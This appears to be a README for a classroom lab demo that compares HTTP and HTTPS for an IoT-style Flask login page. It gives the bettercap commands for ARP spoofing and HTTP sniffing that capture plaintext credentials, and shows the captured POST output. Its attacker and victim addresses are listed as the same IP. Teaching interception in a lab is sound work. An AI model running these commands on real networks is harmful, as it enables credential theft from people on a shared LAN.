# 🔐 HTTPS-IoT Demo: Secure Web Login Against MITM Attacks

This project demonstrates how HTTPS protects user credentials from interception by man-in-the-middle (MITM) attacks. It simulates a login page for an IoT device served over both HTTP and HTTPS, allowing a clear comparison between insecure and secure communication.

📌 Project Overview
- 🔓 **HTTP Mode**: Credentials are sent in plaintext, easily captured via ARP spoofing + packet sniffing.
- 🔒 **HTTPS Mode**: Credentials are encrypted with TLS. MITM attacks will not reveal any sensitive data without the client trusting a malicious certificate.


### Requirements

- `Python 3.x`
- Flask (`pip install flask`)
- A Kali Linux with `bettercap` installed (usually preinstalled)
- Victim device (e.g., another VM or physical device) 

Role | IP Example  
---- | ----- 
Attacker (Kali VM) | 192.168.1.125
Server (This project) | 192.168.1.108
Victim (Ubuntu VM) |	192.168.1.125

*Ensure all devices are on the same LAN or bridge network.*

### 🔓Attack HTTP with Bettercap
**1. Enable IP Forwarding (Kali)**

　`echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward`

**2. Launch Bettercap**

　`sudo bettercap -iface eth0`

　Replace eth0 with your Kali's actual network interface (use `ip a` to check).

**3. In Bettercap console**

　`set arp.spoof.targets 192.168.1.125`  Target the victim

　`arp.spoof on`

**4. Enable HTTP sniffing (for login form capture)**

　`set http.proxy.script /usr/share/bettercap/caplets/http-req-dump/http-req-dump.js`

　`http.proxy on`

　`net.sniff on`

**5. From the server machine**

`py server.py`

By default, it runs at: `http://0.0.0.0:8080`

**6. From the Victim Machine**

　Open browser and visit:

　`http://192.168.1.108:8080/login.html`

　Login with any credentials.

**📥 What You Capture**

In the Bettercap terminal or Web UI (Events), you will see:

`[net.sniff.http.request] POST /login
　username=XXXX&password=YYYY`

### 🔒Defense with HTTPS

Uncomment the `ssl_context` line in `server.py` and run:`python server.py`

Once the server is upgraded to HTTPS, credentials are encrypted

Bettercap will not capture login data unless:

- You use `https.proxy on`

- The victim trusts Bettercap's MITM certificate



## 📂 Folder Structure
MITM/  
    ├── README.md  
    ├── dashnewv10.html          # Simulated dashboard page  
    ├── fetchbannaprice.html       
    ├── index.html                 
    ├── login.html               # Login form page (for capture/testing)  
    ├── server.py                # A script to start a local HTTP/HTTPS service  
    ├── ssl/                   # Self-signed certificate  
    　　├── iot-dash.crt  
    　　└── iot-dash.key  
    └── .idea/                     


